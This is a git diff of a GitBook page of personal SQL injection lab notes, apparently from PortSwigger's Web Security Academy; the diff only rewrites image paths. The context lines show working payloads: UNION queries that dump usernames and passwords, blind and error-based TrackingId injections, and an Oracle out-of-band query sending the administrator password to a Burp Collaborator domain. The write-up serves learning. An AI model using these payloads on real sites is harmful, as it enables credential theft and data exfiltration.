@@ -34,9 +34,9 @@ If the number of nulls does not match the number of columns, the database return
 
 so for this one i just did some recon and looked for the number of columns with the union select parameter, adding NULL variables until it doesn't error out:
 
-<figure><img src="../.gitbook/assets/image (832).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (832).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (833).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (833).png" alt=""><figcaption></figcaption></figure>
 
 #### Database-specific syntax
 
@@ -64,21 +64,21 @@ If the column data type is not compatible with string data, the injected query w
 
 for this one i first determined the number of columns, it took me 3 NULL's to bypass the error, i then inputted the requested string in the different columns to finally solve the lab:
 
-<figure><img src="../.gitbook/assets/image (834).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (834).png" alt=""><figcaption></figcaption></figure>
 
 #### Using a SQL injection UNION attack to retrieve interesting data
 
 ### Lab: SQL injection UNION attack, retrieving data from other tables
 
-<figure><img src="../.gitbook/assets/image (835).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (835).png" alt=""><figcaption></figcaption></figure>
 
 So we are given all the informations needed to construct our sqli,&#x20;
 
-<figure><img src="../.gitbook/assets/image (836).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (836).png" alt=""><figcaption></figcaption></figure>
 
 and on the webpage we got:
 
-<figure><img src="../.gitbook/assets/image (837).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (837).png" alt=""><figcaption></figcaption></figure>
 
 and you just need to connect with those creds to solve lab
 
@@ -96,31 +96,31 @@ You can retrieve multiple values together within this single column by concatena
 
 i start by figuring out how many columns:
 
-<figure><img src="../.gitbook/assets/image (838).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (838).png" alt=""><figcaption></figcaption></figure>
 
 then which one is the good column:
 
-<figure><img src="../.gitbook/assets/image (839).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (839).png" alt=""><figcaption></figcaption></figure>
 
 and final payload ->
 
-<figure><img src="../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>
 
 #### Querying the database type and version
 
 You can potentially identify both the database type and version by injecting provider-specific queries to see if one works
 
-<figure><img src="../.gitbook/assets/image (813).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (813).png" alt=""><figcaption></figcaption></figure>
 
 ### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 
 We start by looking for the number of columns:
 
-<figure><img src="../.gitbook/assets/image (815).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (815).png" alt=""><figcaption></figcaption></figure>
 
 and try to print the version
 
-<figure><img src="../.gitbook/assets/image (816).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (816).png" alt=""><figcaption></figcaption></figure>
 
 #### Listing the contents of the database
 
@@ -138,7 +138,7 @@ We start by looking at the interesting tables
 GET /filter?category=Lifestyle' UNION SELECT table_name, null FROM information_schema.tables--
 ```
 
-<figure><img src="../.gitbook/assets/image (819).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (819).png" alt=""><figcaption></figcaption></figure>
 
 then check the columns in that table to print out the interesting values
 
@@ -146,13 +146,13 @@ then check the columns in that table to print out the interesting values
 GET /filter?category=Lifestyle' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users_znlzdn'--
 ```
 
-<figure><img src="../.gitbook/assets/image (817).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (817).png" alt=""><figcaption></figcaption></figure>
 
 ```
 GET /filter?category=Lifestyle' UNION SELECT username_fjtbql, password_mjqvpb FROM users_znlzdn--
 ```
 
-<figure><img src="../.gitbook/assets/image (818).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (818).png" alt=""><figcaption></figcaption></figure>
 
 #### Blind SQL injection
 
@@ -164,11 +164,11 @@ Many techniques such as `UNION` attacks are not effective with blind SQL injecti
 
 When we don't input well the sqli, the "Welcome back" message does not pop:
 
-<figure><img src="../.gitbook/assets/image (820).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (820).png" alt=""><figcaption></figcaption></figure>
 
 but when we input it well ->
 
-<figure><img src="../.gitbook/assets/image (821).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (821).png" alt=""><figcaption></figcaption></figure>
 
 To verify there is a table called users ->
 
@@ -181,7 +181,7 @@ TrackingId=fNg3RnqiOBbPgwwI'AND (SELECT 'a' FROM users LIMIT 1)='a
 
 Now i want to check if there is a administrator user like the exercice says:
 
-<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 TrackingId=fNg3RnqiOBbPgwwI'AND (SELECT 'a' FROM users WHERE username='administrator')='a
@@ -195,7 +195,7 @@ TrackingId=fNg3RnqiOBbPgwwI'AND (SELECT 'b' FROM users WHERE username='administr
 
 This returns us Welcome back assuming that it is true but when we put in 20 we don't have it anymore. Just to be sure, we can change to = ->
 
-<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Error-based SQL injection
 
@@ -210,7 +210,7 @@ It's when you're able to use error messages to either extract or infer sensitive
 
 We're able to make an error with a single quote on the tracking ID:
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can test out the bounderies of this injection with TRUE & FALSE conditions:
 
@@ -219,9 +219,9 @@ We can test out the bounderies of this injection with TRUE & FALSE conditions:
 ' AND '1'='2
 ```
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>True statement</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>True statement</p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>False statement</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>False statement</p></figcaption></figure>
 
 Since we have the name of the tables and columns to exploit, we can make the correct query:
 
@@ -255,11 +255,11 @@ CAST((SELECT example_column FROM example_table) AS int)
 
 we are able to trigger an error with a single quote on the tracking id:
 
-<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 If we use the CAST command, we get a different error:
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 If we input this query, we do not have any errors anymore&#x20;
 
@@ -271,7 +271,7 @@ If we input this query, we do not have any errors anymore&#x20;
 
 But if we try to adapt and put:
 
-<figure><img src="../.gitbook/assets/2024-04-19_11-12.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2024-04-19_11-12.png" alt=""><figcaption></figcaption></figure>
 
 we see the query is cut to a certain point, so we need to free some space by reducing the initial tracking ID
 
@@ -279,11 +279,11 @@ we see the query is cut to a certain point, so we need to free some space by red
 ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
 ```
 
-<figure><img src="../.gitbook/assets/2024-04-19_11-19.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2024-04-19_11-19.png" alt=""><figcaption></figcaption></figure>
 
 The error is different, so now we can try printing out the password:
 
-<figure><img src="../.gitbook/assets/2024-04-19_11-29.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2024-04-19_11-29.png" alt=""><figcaption></figcaption></figure>
 
 and just like that we are able to connect to the admin account
 
@@ -313,7 +313,7 @@ It is often possible to exploit the blind SQL injection vulnerability by trigger
 
 We need to be aware of the different versions for the time delays:
 
-<figure><img src="../.gitbook/assets/image (844).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (844).png" alt=""><figcaption></figcaption></figure>
 
 This query worked for the injection:
 
@@ -349,19 +349,19 @@ So now the query should look something like this:
 
 I put the cluster bomb, launch the attack and filter out the requests:
 
-<figure><img src="../.gitbook/assets/image (842).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (842).png" alt=""><figcaption></figcaption></figure>
 
 i put a time sleep of 4 seconds so anything in that range and above is probably correct
 
 and for better filter:
 
-<figure><img src="../.gitbook/assets/image (843).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (843).png" alt=""><figcaption></figcaption></figure>
 
 put all the letters in order and solve the challenge
 
 #### Exploiting blind SQL injection using out-of-band (OAST) techniques
 
-<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
 
@@ -398,7 +398,7 @@ This causes the database to perform a lookup for the following domain:
 3. **FROM dual**: In Oracle SQL, `dual` is a special one-row, one-column table. It is commonly used in SQL queries where you don't need to query any particular table, but you still need to execute some SQL logic.
 4. **--**: This is a comment in SQL. Everything after `--` is ignored by the SQL engine.
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 And if you triggered everything properly it solves the lab by interracting with Collaborator
 
@@ -425,11 +425,11 @@ S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
 TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### SQL injection in different contexts
 
@@ -448,11 +448,11 @@ you may be able to bypass these filters by encoding or escaping characters in th
 
 We start by looking at the "check stock" request:
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We check the unicode character of U to perform sqli:
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 &#x55;
@@ -467,11 +467,11 @@ So we will need to bypass the WAF
 
 Another way of encoding everything is to hop on cyberchef
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 and then we get this response to our payload:
 
-<figure><img src="../.gitbook/assets/Capture d’écran du 2024-04-21 11-58-04.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Capture d’écran du 2024-04-21 11-58-04.png" alt=""><figcaption></figcaption></figure>
 
 #### Second-order SQL injection
 
@@ -479,4 +479,4 @@ First-order SQL injection occurs when the application processes user input from 
 
 Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.
 
-<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
